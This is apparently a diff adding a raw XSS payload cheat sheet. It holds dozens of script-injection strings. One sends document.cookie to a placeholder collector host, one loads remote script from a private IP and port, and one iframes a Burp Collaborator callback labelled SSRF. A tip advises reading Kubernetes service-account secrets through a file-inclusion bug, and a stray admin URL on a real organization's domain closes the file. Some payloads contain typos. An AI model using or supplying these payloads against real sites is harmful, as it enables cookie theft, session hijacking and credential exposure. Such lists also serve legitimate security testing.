@@ -1,0 +1,33 @@
+"><img src=x onerror=window.open('https://www.google.com/');>
+"><svg onx=() onload=(location.herf='<BIN>/?mycookies='+document['cookie'])()>
+"--1><Svg/OnLoad=confirm(document.domain)>"
+"--1><Svg/OnLoad=confirm(document.cookie)>"
+"'--!><Script /K/>prompt(document.domain)</Script /K/>#
+"></script/K><Svg/Onload=confirm`Hack`>
+<img src=x onerror="var s=document.createElement('script');s.setAttribute('src','http://192.168.0.29:7777/Yo.html');document.getElementsByTagName('head').item(0).appendChild(s);" />
+</script><svg onload=alert(1)>
+http://brutelogic.com.br/poc.svg
+"></script/K><Svg/Onload=prompt(document.cookie)>
+"'--!><Script/K/>confirm(1)</Script/K/>#
+prompt`${document.domain}`
+\&format=});alert(1);a=function(){```;%3C!--
+\&format=});prompt(1);a=function(){```;%3C!--
+"><svg/onload=confirm(1)>"@x.y
+<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
+}]};(confirm)()//\<A%0aONMouseOvER%0d=%0d[8].find(confirm)>z</tiTlE/><a%0donpOintErentER%0d=%0d(prompt)``>z</SCRiPT/><DETAILs/+/onpoINTERenTEr%0a=%0aa=prompt,a()//
+"onMouseOver="promt(document.domain)
+*
+<script>
+onload=setTimeout
+Event.prototype.toString=
+_=>"alert\501\51"
+</script>
+
+SSRF
+"><iframe src="http://http://1sufo6c5v3s8nq4r58t0ik7mido3cs.burpcollaborator.net"></iframe>
+"><svg/onload=document.write(document.location)>
+
+If you find a LFI ignore /etc/passwd and go for /var/run/secrets/kubernetes.io/serviceaccount this will raise the severity when you hand them a kubernetes token or cert.
+
+
+https://admin.internetsociety.org/622619/Custom
